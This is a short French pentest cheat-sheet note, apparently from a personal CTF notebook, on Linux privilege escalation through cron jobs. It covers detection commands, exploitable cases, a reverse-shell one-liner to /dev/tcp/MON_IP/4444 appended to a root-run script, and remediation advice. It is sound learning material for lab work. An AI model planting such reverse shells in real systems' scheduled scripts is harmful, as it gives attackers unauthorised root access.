---
technique: "Cron Jobs"
os: Linux
categorie: PrivEsc
tags: [technique, privesc, linux, cron]
rooms: []
---

# Cron Jobs

## Principe
> Une tâche cron tourne à intervalle régulier **en tant qu'un user donné** (souvent root). Si le script exécuté est **writable par moi**, ou s'il appelle une commande que je peux détourner, mon code s'exécute avec les droits de cet user.

## Détection
```bash
cat /etc/crontab
ls -la /etc/cron.d/ ; cat /etc/cron.d/*
ls -la /etc/cron.{hourly,daily,weekly,monthly}/
cat /var/spool/cron/crontabs/* 2>/dev/null
# Surveiller les crons qui passent en temps réel :
./pspy64
```

## Cas exploitables
1. **Script world-writable** lancé par root → j'édite le script, j'ajoute ma charge.
2. **Commande sans chemin absolu** dans le script → PATH-Hijacking.
3. **Wildcard** dans une commande (`tar *`) → wildcard injection.

## Exploitation (script writable)
```bash
# Si /opt/scripts/backup.sh est writable et lancé par root
echo 'bash -i >& /dev/tcp/MON_IP/4444 0>&1' >> /opt/scripts/backup.sh
# puis listener nc + attendre le passage du cron
```

## Rooms où je l'ai vu
- jump — le FTP dépose dans `incoming/`, un cron traite le fichier en tant que recon_user → voir Service-Exploitation-Cron

## Remédiation
- Scripts cron en lecture seule pour les non-root, chemins absolus, pas de wildcard non quotée.
